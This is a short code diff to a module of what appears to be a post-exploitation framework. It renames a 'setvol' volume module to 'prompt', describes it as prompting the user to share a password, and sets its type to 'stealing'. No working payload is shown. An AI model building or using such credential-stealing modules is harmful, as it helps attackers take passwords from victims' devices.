@@ -1,15 +1,14 @@
 #!/usr/bin/env python3
 
 from core.badges import badges
-from core.sender import sender
 
 class UnicornModule:
-    def __init__(self, unicorn_handler):
-        self.sender = sender(unicorn_handler)
+    def __init__(self, sender):
+        self.sender = sender
         self.badges = badges()
         
-        self.name = "setvol"
-        self.description = "Set output sound volume."
+        self.name = "prompt"
+        self.description = "Prompt user to share password."
         self.usage = "Usage: prompt"
         self.type = "stealing"
         self.args = 1
